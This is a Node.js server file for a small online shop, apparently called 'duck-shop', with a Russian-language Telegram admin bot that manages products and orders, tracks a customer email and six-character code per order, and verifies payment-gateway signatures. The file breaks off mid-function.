// server.js
require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== КОНФИГУРАЦИЯ =====
const BILEE_API_URL = 'https://paymentgate.bilee.ru/api';
const BILEE_SHOP_ID = process.env.BILEE_SHOP_ID;
const BILEE_PASSWORD = process.env.BILEE_PASSWORD;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_ID = parseInt(process.env.ADMIN_ID);
const SERVER_URL = process.env.SERVER_URL || `https://duck-shop-sever.onrender.com`;

// ===== ИНИЦИАЛИЗАЦИЯ =====
app.use(cors());
app.use(express.json());

// Подключение к PostgreSQL (Render)
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Telegram бот
let bot;
try {
  if (process.env.NODE_ENV === 'production') {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
      polling: {
        timeout: 10,
        interval: 300,
        autoStart: true
      }
    });
  } else {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
  }
  console.log('🤖 Telegram бот инициализирован');
} catch (error) {
  console.error('❌ Ошибка инициализации бота:', error);
  process.exit(1);
}

// ===== УТИЛИТЫ =====
async function generateSignature(data, password) {
  const tokenData = {
    ...data,
    password,
  };

  const excludedKeys = ["metadata", "signature"];
  const sortedTokenData = Object.keys(tokenData)
    .filter((key) => !excludedKeys.includes(key))
    .sort()
    .map((key) => tokenData[key])
    .join("");

  const hash = crypto.createHash('sha256');
  hash.update(sortedTokenData, 'utf8');
  return hash.digest('hex');
}

async function validateSignature(body, password) {
  const validSignature = await generateSignature(body, password);
  return validSignature === body.signature;
}

function formatRub(n) {
  return `${n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ")} ₽`;
}

// Глобальный объект для хранения состояний пользователей
const userStates = {};

async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS orders (
        id SERIAL PRIMARY KEY,
        order_id VARCHAR(50) UNIQUE NOT NULL,
        items JSONB NOT NULL,
        total INTEGER NOT NULL,
        email VARCHAR(100),
        code VARCHAR(6),
        payment_id INTEGER,
        payment_status VARCHAR(20) DEFAULT 'pending',
        status VARCHAR(20) DEFAULT 'new',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    try {
      await pool.query('ALTER TABLE orders ADD COLUMN IF NOT EXISTS code_requested BOOLEAN DEFAULT FALSE');
      console.log('✅ Столбец code_requested добавлен');
    } catch (e) {
      console.log('ℹ️ Столбец code_requested уже существует:', e.message);
    }

    try {
      await pool.query('ALTER TABLE orders ADD COLUMN IF NOT EXISTS wrong_code_attempts INTEGER DEFAULT 0');
      console.log('✅ Столбец wrong_code_attempts добавлен');
    } catch (e) {
      console.log('ℹ️ Столбец wrong_code_attempts уже существует:', e.message);
    }

    await pool.query(`
      CREATE TABLE IF NOT EXISTS products (
        id VARCHAR(50) PRIMARY KEY,
        name VARCHAR(100) NOT NULL,
        price INTEGER NOT NULL,
        image_url TEXT NOT NULL,
        is_gift BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await pool.query('CREATE INDEX IF NOT EXISTS idx_orders_order_id ON orders(order_id)');
    await pool.query('CREATE INDEX IF NOT EXISTS idx_orders_status ON orders(status)');

    console.log('✅ База данных инициализирована');
  } catch (error) {
    console.error('❌ Ошибка инициализации БД:', error);
  }
}

// ===== УЛУЧШЕННАЯ KEEP-ALIVE СИСТЕМА ДЛЯ RENDER =====
app.get('/health', (req, res) => {
  console.log(`[${new Date().toLocaleTimeString('ru-RU')}] Health check from ${req.ip}`);
  res.json({
    status: 'healthy',
    service: 'duck-shop-server',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

app.get('/wakeup', (req, res) => {
  console.log(`🔔 [${new Date().toLocaleTimeString('ru-RU')}] Сервер разбужен внешним пингом от ${req.ip}`);
  res.json({ 
    status: 'awake', 
    time: new Date().toISOString()
  });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get('/status', (req, res) => {
  res.json({
    alive: true,
    timestamp: Date.now(),
    serverTime: new Date().toISOString()
  });
});

let keepAliveInterval;

function pingSelf() {
  try {
    const https = require('https');
    const options = {
      hostname: new URL(SERVER_URL).hostname,
      port: 443,
      path: '/ping',
      method: 'GET',
      timeout: 8000
    };
    
    const req = https.request(options, (res) => {
      console.log(`✅ Self-ping successful (${res.statusCode})`);
    });
    
    req.on('error', (err) => {
      console.log(`⚠️ Self-ping error: ${err.message}`);
    });
    
    req.end();
  } catch (error) {
    console.log(`❌ Self-ping exception: ${error.message}`);
  }
}

function startKeepAlive() {
  if (keepAliveInterval) clearInterval(keepAliveInterval);
  const interval = 4 * 60 * 1000 + Math.floor(Math.random() * 2 * 60 * 1000);
  keepAliveInterval = setInterval(pingSelf, interval);
  setTimeout(pingSelf, 3000);
  console.log(`🔄 Keep-alive system started (every ${Math.round(interval/60000)} minutes)`);
}

process.on('SIGTERM', () => {
  console.log('🛑 Получен SIGTERM, завершаем работу...');
  if (keepAliveInterval) {
    clearInterval(keepAliveInterval);
    keepAliveInterval = null;
  }
  if (bot) bot.stopPolling();
  setTimeout(() => process.exit(0), 1000);
});

process.on('SIGINT', () => {
  console.log('🛑 Получен SIGINT, завершаем работу...');
  if (keepAliveInterval) {
    clearInterval(keepAliveInterval);
    keepAliveInterval = null;
  }
  if (bot) bot.stopPolling();
  setTimeout(() => process.exit(0), 1000);
});

// ===== TELEGRAM БОТ =====
function isAdmin(msg) {
  return msg.from.id === ADMIN_ID;
}

// Команда /start
bot.onText(/\/start/, async (msg) => {
  if (!isAdmin(msg)) {
    bot.sendMessage(msg.chat.id, '⛔ Доступ запрещен');
    return;
  }
  
  const welcomeText = `👋 Привет, администратор!\n\n📋 Доступные команды:\n/orders - просмотреть заказы\n/stats - статистика магазина\n/products - список товаров\n/add_product - добавить товар\n/delete_product - удалить товар\n/cancel - отменить текущее действие\n\nℹ️ Для добавления товара используйте /add_product`;
  bot.sendMessage(msg.chat.id, welcomeText);
});

// Команда /stats
bot.onText(/\/stats/, async (msg) => {
  if (!isAdmin(msg)) return;
  
  try {
    const totalOrdersResult = await pool.query(
      "SELECT COUNT(*) as total_orders, SUM(total) as total_revenue FROM orders WHERE payment_status = 'confirmed'"
    );
    
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    
    const todayOrdersResult = await pool.query(
      "SELECT COUNT(*) as today_orders, SUM(total) as today_revenue FROM orders WHERE payment_status = 'confirmed' AND created_at >= $1",
      [today]
    );
    
    const statusStatsResult = await pool.query(
      "SELECT status, COUNT(*) as count FROM orders GROUP BY status ORDER BY count DESC"
    );
    
    const topProductsResult = await pool.query(`
      SELECT p.name, COUNT(o.id) as order_count, SUM(o.total) as total_revenue
      FROM orders o
      JOIN LATERAL jsonb_each_text(o.items) AS item(id, quantity) ON true
      JOIN products p ON item.id = p.id
      WHERE o.payment_status = 'confirmed'
      GROUP BY p.id, p.name
      ORDER BY total_revenue DESC
      LIMIT 5
    `);
    
    const totalOrders = totalOrdersResult.rows[0]?.total_orders || 0;
    const totalRevenue = totalOrdersResult.rows[0]?.total_revenue || 0;
    const todayOrders = todayOrdersResult.rows[0]?.today_orders || 0;
    const todayRevenue = todayOrdersResult.rows[0]?.today_revenue || 0;
    
    let statsText = `📊 Статистика магазина\n\n`;
    statsText += `📦 Всего заказов: ${totalOrders}\n`;
    statsText += `💰 Общая выручка: ${formatRub(totalRevenue)}\n\n`;
    statsText += `📅 За сегодня:\n`;
    statsText += `   Заказов: ${todayOrders}\n`;
    statsText += `   Выручка: ${formatRub(todayRevenue)}\n\n`;
    
    statsText += `📈 Статусы заказов:\n`;
    statusStatsResult.rows.forEach(row => {
      statsText += `   ${getStatusText(row.status)}: ${row.count}\n`;
    });
    
    if (topProductsResult.rows.length > 0) {
      statsText += `\n🏆 Топ товаров по выручке:\n`;
      topProductsResult.rows.forEach((row, index) => {
        statsText += `${index + 1}. ${row.name}\n`;
        statsText += `   Заказов: ${row.order_count}\n`;
        statsText += `   Выручка: ${formatRub(row.total_revenue)}\n`;
      });
    }
    
    await bot.sendMessage(msg.chat.id, statsText);
  } catch (error) {
    console.error('❌ Ошибка получения статистики:', error);
    bot.sendMessage(msg.chat.id, '❌ Ошибка при получении статистики');
  }
});

// Команда /products
bot.onText(/\/products/, async (msg) => {
  if (!isAdmin(msg)) return;
  
  try {
    const result = await pool.query(
      'SELECT id, name, price, is_gift FROM products ORDER BY created_at DESC'
    );
    
    if (result.rows.length === 0) {
      bot.sendMessage(msg.chat.id, '📭 Нет товаров в базе данных');
      return;
    }
    
    let productsText = `📦 Список товаров (${result.rows.length} шт.)\n\n`;
    
    result.rows.forEach((product, index) => {
      const giftEmoji = product.is_gift ? ' 🎁' : '';
      productsText += `${index + 1}. ${product.name}${giftEmoji}\n`;
      productsText += `   ID: ${product.id}\n`;
      productsText += `   Цена: ${formatRub(product.price)}\n\n`;
    });
    
    const keyboard = {
      inline_keyboard: [
        [
          { text: '➕ Добавить товар', callback_data: 'add_product_prompt' },
          { text: '🗑️ Удалить товар', callback_data: 'delete_product_list' }
        ]
      ]
    };
    
    bot.sendMessage(msg.chat.id, productsText, { reply_markup: keyboard });
  } catch (error) {
    console.error('❌ Ошибка получения товаров:', error);
    bot.sendMessage(msg.chat.id, '❌ Ошибка при получении списка товаров');
  }
});

// Команда /add_product
bot.onText(/\/add_product/, async (msg) => {
  if (!isAdmin(msg)) return;
  
  const chatId = msg.chat.id;
  userStates[chatId] = {
    step: 'awaiting_name',
    productData: {}
  };
  
  bot.sendMessage(chatId, '📝 Давайте добавим новый товар.\n\nШаг 1/4: Введите название товара:');
});

// Команда /delete_product
bot.onText(/\/delete_product/, async (msg) => {
  if (!isAdmin(msg)) return;
  
  try {
    const result = await pool.query(
      'SELECT id, name, price FROM products ORDER BY name'
    );
    
    if (result.rows.length === 0) {
      bot.sendMessage(msg.chat.id, '📭 Нет товаров для удаления');
      return;
    }
    
    const keyboard = {
      inline_keyboard: result.rows.map(product => [
        { text: `${product.name} - ${formatRub(product.price)}`, callback_data: `delete_product:${product.id}` }
      ])
    };
    
    bot.sendMessage(msg.chat.id, '🗑️ Выберите товар для удаления:', { reply_markup: keyboard });
  } catch (error) {
    console.error('❌ Ошибка получения товаров:', error);
    bot.sendMessage(msg.chat.id, '❌ Ошибка при получении списка товаров');
  }
});

// Команда /orders
bot.onText(/\/orders/, async (msg) => {
  if (!isAdmin(msg)) return;
  
  try {
    const result = await pool.query(
      'SELECT order_id, total, status, created_at FROM orders ORDER BY created_at DESC LIMIT 10'
    );
    
    if (result.rows.length === 0) {
      bot.sendMessage(msg.chat.id, '📭 Нет заказов');
      return;
    }
    
    const keyboard = {
      inline_keyboard: result.rows.map(order => [
        {
          text: `#${order.order_id} - ${formatRub(order.total)} - ${getStatusText(order.status)}`,
          callback_data: `order_detail:${order.order_id}`
        }
      ])
    };
    
    let ordersText = '📋 Последние заказы:\n\n';
    result.rows.forEach((order, index) => {
      ordersText += `${index + 1}. Заказ #${order.order_id}\n`;
      ordersText += `   Сумма: ${formatRub(order.total)}\n`;
      ordersText += `   Статус: ${getStatusText(order.status)}\n`;
      ordersText += `   Дата: ${new Date(order.created_at).toLocaleString('ru-RU')}\n\n`;
    });
    
    bot.sendMessage(msg.chat.id, ordersText, { reply_markup: keyboard });
  } catch (error) {
    console.error('❌ Ошибка получения заказов:', error);
    bot.sendMessage(msg.chat.id, '❌ Ошибка при получении заказов');
  }
});

// Команда /cancel
bot.onText(/\/cancel/, async (msg) => {
  if (!isAdmin(msg)) return;
  
  const chatId = msg.chat.id;
  if (userStates[chatId]) {
    delete userStates[chatId];
    bot.sendMessage(chatId, '❌ Текущее действие отменено.');
  }
});

// Обработка текстовых сообщений
bot.on('message', async (msg) => {
  if (!isAdmin(msg) || !msg.text || msg.text.startsWith('/')) return;
  
  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const userState = userStates[chatId];
  
  if (userState && userState.step) {
    await handleAddProductStep(msg, userState);
  }
});

async function handleAddProductStep(msg, userState) {
  const chatId = msg.chat.id;
  const text = msg.text.trim();
  
  try {
    switch(userState.step) {
      case 'awaiting_name':
        if (text.length < 2 || text.length > 100) {
          bot.sendMessage(chatId, '❌ Название должно быть от 2 до 100 символов. Введите название еще раз:');
          return;
        }
        userState.productData.name = text;
        userState.step = 'awaiting_price';
        bot.sendMessage(chatId, '✅ Название сохранено.\n\nШаг 2/4: Введите цену товара (в рублях, только цифры):');
        break;
        
      case 'awaiting_price':
        const price = parseInt(text);
        if (isNaN(price) || price < 10 || price > 10000) {
          bot.sendMessage(chatId, '❌ Цена должна быть числом от 10 до 10000 рублей. Введите цену еще раз:');
          return;
        }
        userState.productData.price = price;
        userState.step = 'awaiting_image';
        bot.sendMessage(chatId, '✅ Цена сохранена.\n\nШаг 3/4: Введите URL изображения товара:');
        break;
        
      case 'awaiting_image':
        if (!text.startsWith('http://') && !text.startsWith('https://')) {
          bot.sendMessage(chatId, '❌ URL должен начинаться с http:// или https://. Введите URL еще раз:');
          return;
        }
        userState.productData.image_url = text;
        userState.step = 'awaiting_gift';
        const keyboard = {
          reply_markup: {
            inline_keyboard: [
              [
                { text: '✅ Да, это подарок', callback_data: 'set_gift:1' },
                { text: '❌ Нет, обычный товар', callback_data: 'set_gift:0' }
              ]
            ]
          }
        };
        bot.sendMessage(chatId, '✅ URL изображения сохранен.\n\nШаг 4/4: Это подарочный товар?', keyboard);
        break;
        
      case 'awaiting_gift':
        bot.sendMessage(chatId, 'ℹ️ Пожалуйста, используйте кнопки выше для выбора типа товара.');
        return;
    }
    
    userStates[chatId] = userState;
  } catch (error) {
    console.error('❌ Ошибка обработки шага:', error);
    bot.sendMessage(chatId, '❌ Произошла ошибка. Начните заново командой /add_product');
    delete userStates[chatId];
  }
}

// Основной обработчик callback-кнопок
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  
  if (!isAdmin(callbackQuery)) {
    await bot.answerCallbackQuery(callbackQuery.id, { 
      text: '⛔ Доступ запрещен',
      show_alert: true 
    });
    return;
  }
  
  try {
    if (data.startsWith('order_detail:')) {
      const orderId = data.split(':')[1];
      await showOrderDetails(msg.chat.id, msg.message_id, orderId);
      await bot.answerCallbackQuery(callbackQuery.id);
      return;
    }
    
    const [action, ...params] = data.split(':');
    
    switch(action) {
      case 'request_code':
        await handleRequestCode(params[0], msg, callbackQuery.id);
        break;
      case 'order_ready':
        await handleOrderReady(params[0], msg, callbackQuery.id);
        break;
      case 'wrong_code':
        await handleWrongCode(params[0], msg, callbackQuery.id);
        break;
      case 'mark_completed':
        await handleMarkCompleted(params[0], msg, callbackQuery.id);
        break;
      case 'back_to_orders':
        await handleBackToOrders(msg);
        await bot.answerCallbackQuery(callbackQuery.id);
        break;
      case 'force_complete':
        await completeOrder(params[0], msg, callbackQuery.id);
        break;
      case 'add_product_prompt':
        await bot.answerCallbackQuery(callbackQuery.id);
        bot.sendMessage(msg.chat.id, '📝 Отправьте команду /add_product чтобы начать добавление товара');
        break;
      case 'delete_product_list':
        await handleDeleteProductList(msg, callbackQuery.id);
        break;
      case 'delete_product':
        await handleDeleteProduct(params[0], msg, callbackQuery.id);
        break;
      case 'set_gift':
        await handleSetGift(params[0], msg, callbackQuery.id);
        break;
      case 'cancel_add_product':
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Добавление отменено' });
        await bot.editMessageText('❌ Добавление товара отменено.', {
          chat_id: msg.chat.id,
          message_id: msg.message_id
        });
        break;
      default:
        await bot.answerCallbackQuery(callbackQuery.id, { 
          text: '⚠️ Неизвестная команда',
          show_alert: true 
        });
    }
  } catch (error) {
    console.error('❌ Ошибка обработки callback:', error);
    await bot.answerCallbackQuery(callbackQuery.id, { 
      text: '❌ Ошибка обработки запроса',
      show_alert: true 
    });
  }
});

async function handleSetGift(isGift, msg, callbackQueryId) {
  const chatId = msg.chat.id;
  const userState = userStates[chatId];
  
  if (!userState || userState.step !== 'awaiting_gift') {
    await bot.answerCallbackQuery(callbackQueryId, { text: '❌ Сессия устарела. Начните заново командой /add_product' });
    return;
  }
  
  try {
    const is_gift = isGift === '1';
    userState.productData.is_gift = is_gift;
    
    const timestamp = Date.now();
    const randomString = Math.random().toString(36).substr(2, 8);
    const id = `prod_${timestamp}${randomString}`;
    
    const { name, price, image_url } = userState.productData;
    
    await pool.query(
      'INSERT INTO products (id, name, price, image_url, is_gift) VALUES ($1, $2, $3, $4, $5)',
      [id, name, price, image_url, is_gift]
    );
    
    const successText = `🎉 Товар успешно добавлен!\n\n📝 Информация о товаре:\n🆔 ID: ${id}\n🏷️ Название: ${name}\n💰 Цена: ${formatRub(price)}\n🎁 Подарок: ${is_gift ? '✅ Да' : '❌ Нет'}\n🖼️ Изображение: ${image_url.substring(0, 30)}...`;
    
    delete userStates[chatId];
    
    await bot.editMessageText(successText, {
      chat_id: msg.chat.id,
      message_id: msg.message_id
    });
    
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '✅ Товар добавлен!',
      show_alert: false
    });
  } catch (error) {
    console.error('❌ Ошибка сохранения товара:', error);
    delete userStates[chatId];
    await bot.editMessageText('❌ Ошибка при сохранении товара. Попробуйте еще раз командой /add_product', {
      chat_id: msg.chat.id,
      message_id: msg.message_id
    });
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Ошибка сохранения',
      show_alert: true
    });
  }
}

// Запросить код у пользователя (ОБНОВЛЕНО)
async function handleRequestCode(orderId, msg, callbackQueryId) {
  try {
    console.log(`📝 Запрос кода для заказа ${orderId}`);
    
    // Сбрасываем счетчик неверных попыток при новом запросе
    await pool.query(
      "UPDATE orders SET code_requested = TRUE, wrong_code_attempts = 0, status = 'waiting_code_request' WHERE order_id = $1",
      [orderId]
    );
    
    const orderResult = await pool.query(
      'SELECT email, total FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    const order = orderResult.rows[0];
    const message = `📝 Код запрошен для заказа #${orderId}\n\n📧 Email: ${order?.email || 'не указан'}\n💰 Сумма: ${formatRub(order?.total || 0)}\n\n✅ Пользователю открыт экран для ввода кода.`;
    
    await bot.editMessageText(message, {
      chat_id: msg.chat.id,
      message_id: msg.message_id
    });
    
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '✅ Код запрошен у пользователя',
      show_alert: false
    });
  } catch (error) {
    console.error('❌ Ошибка запроса кода:', error);
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Ошибка при запросе кода',
      show_alert: true
    });
  }
}

// Отметить код как неверный (ОБНОВЛЕНО)
async function handleWrongCode(orderId, msg, callbackQueryId) {
  try {
    console.log(`❌ Отмечаем код как неверный для заказа ${orderId}`);
    
    const orderResult = await pool.query(
      'SELECT wrong_code_attempts, email FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (orderResult.rows.length === 0) {
      await bot.answerCallbackQuery(callbackQueryId, { 
        text: '❌ Заказ не найден',
        show_alert: true 
      });
      return;
    }
    
    const currentAttempts = orderResult.rows[0].wrong_code_attempts || 0;
    const newAttempts = currentAttempts + 1;
    
    // Сбрасываем код, запрос кода и устанавливаем статус 'waiting'
    await pool.query(
      "UPDATE orders SET wrong_code_attempts = $1, code = NULL, code_requested = FALSE, status = 'waiting' WHERE order_id = $2",
      [newAttempts, orderId]
    );
    
    let message = `❌ Код для заказа #${orderId} отмечен как неверный\n\n`;
    message += `Неверных попыток: ${newAttempts}\n`;
    message += `Пользователю показан экран с ошибкой и ожидает нового запроса кода.`;
    
    if (newAttempts >= 2) {
      message += `\n\n⚠️ Пользователь будет перенаправлен в поддержку.`;
    }
    
    await bot.editMessageText(message, {
      chat_id: msg.chat.id,
      message_id: msg.message_id
    });
    
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Код отмечен неверным',
      show_alert: false 
    });
  } catch (error) {
    console.error('❌ Ошибка отметки кода как неверного:', error);
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Ошибка',
      show_alert: true 
    });
  }
}

async function handleMarkCompleted(orderId, msg, callbackQueryId) {
  try {
    console.log(`✅ Помечаем заказ ${orderId} как готовый`);
    const orderResult = await pool.query(
      'SELECT status, email, code, code_requested FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (orderResult.rows.length === 0) {
      await bot.answerCallbackQuery(callbackQueryId, { 
        text: '❌ Заказ не найден',
        show_alert: true 
      });
      return;
    }
    
    const order = orderResult.rows[0];
    if (order.status === 'completed') {
      await bot.answerCallbackQuery(callbackQueryId, { 
        text: '⚠️ Заказ уже отмечен как готовый',
        show_alert: true 
      });
      return;
    }
    
    if (order.code_requested && !order.code) {
      const confirmKeyboard = {
        inline_keyboard: [[
          { text: '✅ Да, все равно завершить', callback_data: `force_complete:${orderId}` },
          { text: '❌ Отмена', callback_data: `order_detail:${orderId}` }
        ]]
      };
      
      await bot.editMessageText(`⚠️ Внимание!\n\nКод был запрошен у пользователя, но он еще не ввел его.\n\nВы уверены, что хотите завершить заказ без кода?`, {
        chat_id: msg.chat.id,
        message_id: msg.message_id,
        reply_markup: confirmKeyboard
      });
      
      await bot.answerCallbackQuery(callbackQueryId, { 
        text: '⚠️ Требуется подтверждение',
        show_alert: false 
      });
      return;
    }
    
    await completeOrder(orderId, msg, callbackQueryId);
  } catch (error) {
    console.error('❌ Ошибка отметки заказа как готового:', error);
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Ошибка при обновлении статуса заказа',
      show_alert: true 
    });
  }
}

async function completeOrder(orderId, msg, callbackQueryId) {
  await pool.query(
    "UPDATE orders SET status = 'completed' WHERE order_id = $1",
    [orderId]
  );
  
  const orderResult = await pool.query(
    'SELECT email, code FROM orders WHERE order_id = $1',
    [orderId]
  );
  
  const order = orderResult.rows[0];
  let message = `✅ Заказ #${orderId} отмечен как готовый\n\n`;
  if (order.email) message += `📧 Email: ${order.email}\n`;
  if (order.code) message += `🔢 Код: ${order.code}\n`;
  message += `\n✅ Пользователь будет уведомлен о готовности заказа.`;
  
  await bot.editMessageText(message, {
    chat_id: msg.chat.id,
    message_id: msg.message_id
  });
  
  await bot.answerCallbackQuery(callbackQueryId, { 
    text: '✅ Заказ отмечен как готовый',
    show_alert: false
  });
}

// Подтвердить код (заказ готов)
async function handleOrderReady(orderId, msg, callbackQueryId) {
  try {
    console.log(`✅ Подтверждаем код для заказа ${orderId}`);
    const orderResult = await pool.query(
      'SELECT code, email, total FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (orderResult.rows.length === 0) {
      await bot.answerCallbackQuery(callbackQueryId, { 
        text: '❌ Заказ не найден',
        show_alert: true 
      });
      return;
    }
    
    const order = orderResult.rows[0];
    if (!order.code) {
      await bot.answerCallbackQuery(callbackQueryId, { 
        text: '❌ Код не введен пользователем',
        show_alert: true 
      });
      return;
    }
    
    await pool.query(
      "UPDATE orders SET status = 'completed' WHERE order_id = $1",
      [orderId]
    );
    
    const message = `✅ Заказ #${orderId} завершен\n\n💰 Сумма: ${formatRub(order.total)}\n📧 Email: ${order.email || 'не указан'}\n🔢 Код: ${order.code}\n\n✅ Заказ успешно обработан и завершен.`;
    
    await bot.editMessageText(message, {
      chat_id: msg.chat.id,
      message_id: msg.message_id
    });
    
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '✅ Заказ завершен',
      show_alert: false
    });
  } catch (error) {
    console.error('❌ Ошибка подтверждения кода:', error);
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Ошибка',
      show_alert: true 
    });
  }
}

async function handleDeleteProductList(msg, callbackQueryId) {
  try {
    const result = await pool.query(
      'SELECT id, name, price FROM products ORDER BY name'
    );
    
    if (result.rows.length === 0) {
      await bot.answerCallbackQuery(callbackQueryId, { text: '📭 Нет товаров для удаления' });
      return;
    }
    
    const keyboard = {
      inline_keyboard: result.rows.map(product => [
        { text: `${product.name} - ${formatRub(product.price)}`, callback_data: `delete_product:${product.id}` }
      ])
    };
    
    await bot.editMessageText('🗑️ Выберите товар для удаления:', {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      reply_markup: keyboard
    });
    
    await bot.answerCallbackQuery(callbackQueryId);
  } catch (error) {
    console.error('❌ Ошибка получения списка товаров:', error);
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Ошибка при получении списка товаров',
      show_alert: true 
    });
  }
}

async function handleDeleteProduct(productId, msg, callbackQueryId) {
  try {
    const productResult = await pool.query(
      'SELECT name, price FROM products WHERE id = $1',
      [productId]
    );
    
    if (productResult.rows.length === 0) {
      await bot.answerCallbackQuery(callbackQueryId, { 
        text: '❌ Товар не найден',
        show_alert: true 
      });
      return;
    }
    
    const product = productResult.rows[0];
    await pool.query('DELETE FROM products WHERE id = $1', [productId]);
    
    const successText = `🗑️ Товар удален!\n\nНазвание: ${product.name}\nЦена: ${formatRub(product.price)}\nID: ${productId}`;
    
    await bot.editMessageText(successText, {
      chat_id: msg.chat.id,
      message_id: msg.message_id
    });
    
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '✅ Товар удален',
      show_alert: false
    });
  } catch (error) {
    console.error('❌ Ошибка удаления товара:', error);
    await bot.answerCallbackQuery(callbackQueryId, { 
      text: '❌ Ошибка при удалении товара',
      show_alert: true 
    });
  }
}

// Показать детали заказа
async function showOrderDetails(chatId, messageId, orderId) {
  try {
    const result = await pool.query(
      'SELECT * FROM orders WHERE order_id = $1',
      [orderId]
    );
    
    if (result.rows.length === 0) {
      await bot.editMessageText('❌ Заказ не найден', {
        chat_id: chatId,
        message_id: messageId
      });
      return;
    }
    
    const order = result.rows[0];
    const items = order.items || {};
    
    let itemsText = '';
    let totalItems = 0;
    
    for (const [id, qty] of Object.entries(items)) {
      const productResult = await pool.query(
        'SELECT name FROM products WHERE id = $1',
        [id]
      );
      
      const productName = productResult.rows[0]?.name || `Товар ${id}`;
      itemsText += `• ${productName}: ${qty} шт.\n`;
      totalItems += parseInt(qty);
    }
    
    const orderText = `📋 Детали заказа #${order.order_id}\n\n` +
      `💰 Сумма: ${formatRub(order.total)}\n` +
      `📧 Почта: ${order.email || 'не указана'}\n` +
      `🔢 Код: ${order.code || 'не введен'}\n` +
      `📦 Товаров: ${totalItems} шт.\n` +
      `📊 Статус: ${getStatusText(order.status)}\n` +
      `💳 Оплата: ${order.payment_status === 'confirmed' ? '✅ Оплачен' : '❌ Не оплачен'}\n` +
      `📅 Дата: ${new Date(order.created_at).toLocaleString('ru-RU')}\n\n` +
      `🛒 Состав заказа:\n${itemsText}`;
    
    let keyboardRows = [];
    
    if (order.status !== 'completed') {
      keyboardRows.push([
        { text: '✅ Сделать готовым', callback_data: `mark_completed:${orderId}` }
      ]);
    }
    
    if (order.email && !order.code_requested && order.status !== 'completed' && !order.code) {
      keyboardRows.push([
        { text: '📝 Запросить код', callback_data: `request_code:${orderId}` }
      ]);
    }
    
    if (order.code && order.status === 'waiting') {
      keyboardRows.push([
        { text: '✅ Подтвердить код', callback_data: `order_ready:${orderId}` },
        { text: '❌ Неверный код', callback_data: `wrong_code:${orderId}` }
      ]);
    }
    
    keyboardRows.push([
      { text: '⬅️ Назад к заказам', callback_data: `back_to_orders:${orderId}` }
    ]);
    
    const keyboard = {
      inline_keyboard: keyboardRows
    };
    
    await bot.editMessageText(orderText, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: keyboard
    });
  } catch (error) {
    console.error('Ошибка показа деталей заказа:', error);
    await bot.editMessageText('❌ Ошибка при получении деталей заказа', {
      chat_id: chatId,
      message_id: messageId
    });
  }
}

async function handleBackToOrders(msg) {
  try {
    const result = await pool.query(
      'SELECT order_id, total, status, created_at FROM orders ORDER BY created_at DESC LIMIT 10'
    );
    
    if (result.rows.length === 0) {
      await bot.editMessageText('📭 Нет заказов', {
        chat_id: msg.chat.id,
        message_id: msg.message_id
      });
      return;
    }
    
    const keyboard = {
      inline_keyboard: result.rows.map(order => [
        {
          text: `#${order.order_id} - ${formatRub(order.total)} - ${getStatusText(order.status)}`,
          callback_data: `order_detail:${order.order_id}`
        }
      ])
    };
    
    let ordersText = '📋 Последние заказы:\n\n';
    result.rows.forEach((order, index) => {
      ordersText += `${index + 1}. Заказ #${order.order_id}\n`;
      ordersText += `   Сумма: ${formatRub(order.total)}\n`;
      ordersText += `   Статус: ${getStatusText(order.status)}\n`;
      ordersText += `   Дата: ${new Date(order.created_at).toLocaleString('ru-RU')}\n\n`;
    });
    
    await bot.editMessageText(ordersText, {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      reply_markup: keyboard
    });
  } catch (error) {
    console.error('Ошибка возврата к заказам:', error);
  }
}

async function sendNewOrderNotification(orderId, total, email) {
  try {
    const result = await pool.query(
      'SELECT items FROM orders WHERE order_id = $1',
      [orderId]
    );
    const items = result.rows[0]?.items || {};
    
    let itemsText = '';
    let totalItems = 0;
    
    for (const [id, qty] of Object.entries(items)) {
      const productResult = await pool.query(
        'SELECT name FROM products WHERE id = $1',
        [id]
      );
      
      const productName = productResult.rows[0]?.name || `Товар ${id}`;
      itemsText += `• ${productName}: ${qty} шт.\n`;
      totalItems += parseInt(qty);
    }
    
    const text = `🛒 Новый заказ #${orderId}\n\n💰 Сумма: ${formatRub(total)}\n📦 Товаров: ${totalItems} шт.\n📧 Почта: ${email || 'не указана'}\n\n📋 Состав заказа:\n${itemsText}`;
    
    const keyboard = {
